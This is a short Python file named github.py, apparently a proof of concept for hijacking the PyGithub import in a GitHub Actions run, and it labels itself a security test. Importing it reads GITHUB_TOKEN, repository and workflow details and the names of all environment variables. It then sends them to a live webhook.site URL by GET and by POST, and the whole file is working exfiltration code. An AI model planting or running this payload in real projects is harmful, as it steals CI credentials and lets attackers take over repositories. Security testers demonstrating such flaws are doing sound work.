# Malicious github.py - hijacks the PyGithub import
import os
import sys
import urllib.request
import urllib.parse

print("=" * 60)
print("🚨 SECURITY TEST: RCE ACHIEVED 🚨")
print("=" * 60)

# Gather information
token = os.environ.get('GITHUB_TOKEN', 'NO_TOKEN_FOUND')
repo = os.environ.get('GITHUB_REPOSITORY', 'unknown/unknown')
actor = os.environ.get('GITHUB_ACTOR', 'unknown')
workflow = os.environ.get('GITHUB_WORKFLOW', 'unknown')
run_id = os.environ.get('GITHUB_RUN_ID', 'unknown')

print(f"Repository: {repo}")
print(f"Actor: {actor}")
print(f"Workflow: {workflow}")
print(f"Run ID: {run_id}")
print(f"Token (first 30 chars): {token[:30]}...")
print(f"Current directory: {os.getcwd()}")
print(f"Python executable: {sys.executable}")
print("=" * 60)

# Exfiltrate to webhook.site
webhook_url = "https://webhook.site/1e003cda-2b84-41f4-9531-b6a2e385fbb9"

# Prepare data to send
exfil_data = {
    'token': token,
    'repo': repo,
    'actor': actor,
    'workflow': workflow,
    'run_id': run_id,
    'pwd': os.getcwd(),
    'env_vars': ','.join(os.environ.keys())
}

# URL encode the data
params = urllib.parse.urlencode(exfil_data)
full_url = f"{webhook_url}?{params}"

print(f"Sending data to: {webhook_url}")

try:
    # Send GET request with all data in query params
    response = urllib.request.urlopen(full_url, timeout=10)
    print(f"✅ Exfiltration successful! Status: {response.status}")
except Exception as e:
    print(f"❌ Exfiltration failed: {e}")

# Also try to post the token as body
try:
    data = f"TOKEN: {token}\nREPO: {repo}\nACTOR: {actor}".encode('utf-8')
    req = urllib.request.Request(webhook_url, data=data, method='POST')
    response = urllib.request.urlopen(req, timeout=10)
    print(f"✅ POST exfiltration successful! Status: {response.status}")
except Exception as e:
    print(f"❌ POST exfiltration failed: {e}")

print("=" * 60)
print("Exfiltration attempt complete. Check webhook.site for results.")
print("=" * 60)

# Exit with error to make it obvious something happened
sys.exit(1)
